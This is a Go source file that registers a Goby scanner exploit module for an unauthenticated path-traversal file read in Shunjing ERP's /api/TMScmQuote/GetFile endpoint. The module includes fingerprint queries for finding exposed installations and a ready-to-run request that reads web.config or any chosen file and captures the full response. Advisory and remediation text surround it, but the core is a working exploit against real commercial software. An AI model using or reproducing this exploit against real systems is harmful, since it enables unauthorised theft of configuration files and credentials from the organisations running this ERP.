package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Shunjing ERP /api/TMScmQuote/GetFile File Read Vulnerability",
    "Description": "<p>Shunjing ERP is a comprehensive, highly integrated, and extensible enterprise management software widely used in the intelligent management of manufacturing enterprises. This vulnerability exists in the TMScmQuote/GetFile interface of Shunjing ERP, allowing attackers to read arbitrary files in the system (e.g., database configuration files, system configuration files) through crafted requests, leading to sensitive information disclosure and potentially more severe attacks.</p>",
    "Product": "Shunjing ERP",
    "Homepage": "http://www.sunkeysoft.com/",
    "DisclosureDate": "2024-12-04",
    "PostTime": "2024-12-04",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(body=\"顺景ERP\" && body=\"顺景软件\" && body=\"WebAPI\")||body=\"/api/DBRecord/getDBRecords\"",
    "GobyQuery": "(body=\"顺景ERP\" && body=\"顺景软件\" && body=\"WebAPI\")||body=\"/api/DBRecord/getDBRecords\"",
    "Level": "3",
    "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files in the system through the TMScmQuote/GetFile interface, potentially leading to sensitive information disclosure, including database configuration files and system configuration files, exposing the system to risks of data leakage, privilege escalation, and further attacks.</p>",
    "Recommendation": "<p>1. Disable the exposed interfaces on the internet.</p><p>2. Set strict access permissions.</p><p>3. Upgrade Shunjing ERP to the latest secure version provided by the vendor:<a href=\"http://www.sunkeysoft.com/\">http://www.sunkeysoft.com/</a></p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/144240111?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "textarea",
            "value": "web.config",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "web.config",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName=",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/api/TMScmQuote/GetFile?FullGuidFileName=/../{{{filePath}}}&FileName=",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": "Check if the response contains XML configuration content"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<configuration>",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "顺景ERP /api/TMScmQuote/GetFile 文件读取漏洞",
            "Product": "顺景ERP",
            "Description": "<p>顺景ERP是一款功能全面、高度集成、易于扩展的企业管理软件，广泛应用于制造企业的智能化管理。该漏洞存在于顺景ERP的TMScmQuote/GetFile接口中，攻击者可以通过构造恶意请求读取系统中的任意文件（如数据库配置文件、系统配置文件等），从而导致敏感信息泄露，进一步可能被利用进行更严重的攻击。</p>",
            "Recommendation": "<p>1. 关闭暴露在互联网的相关接口。</p><p>2. 设置严格的访问权限。</p><p>3. 升级顺景ERP至厂商提供的最新安全版本：<a href=\"http://www.sunkeysoft.com/\">http://www.sunkeysoft.com/</a></p>",
            "Impact": "<p>该漏洞允许未经身份验证的攻击者通过TMScmQuote/GetFile接口读取系统中的任意文件（如数据库配置文件、系统配置文件等），导致敏感信息泄露，可能进一步被利用进行数据泄露、权限提升或其他攻击。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Shunjing ERP /api/TMScmQuote/GetFile File Read Vulnerability",
            "Product": "Shunjing ERP",
            "Description": "<p>Shunjing ERP is a comprehensive, highly integrated, and extensible enterprise management software widely used in the intelligent management of manufacturing enterprises. This vulnerability exists in the TMScmQuote/GetFile interface of Shunjing ERP, allowing attackers to read arbitrary files in the system (e.g., database configuration files, system configuration files) through crafted requests, leading to sensitive information disclosure and potentially more severe attacks.</p>",
            "Recommendation": "<p>1. Disable the exposed interfaces on the internet.</p><p>2. Set strict access permissions.</p><p>3. Upgrade Shunjing ERP to the latest secure version provided by the vendor:<a href=\"http://www.sunkeysoft.com/\">http://www.sunkeysoft.com/</a></p>",
            "Impact": "<p>This vulnerability allows unauthenticated attackers to read arbitrary files in the system through the TMScmQuote/GetFile interface, potentially leading to sensitive information disclosure, including database configuration files and system configuration files, exposing the system to risks of data leakage, privilege escalation, and further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}"
    },
    "VariablesOrder": [
        "filePath"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}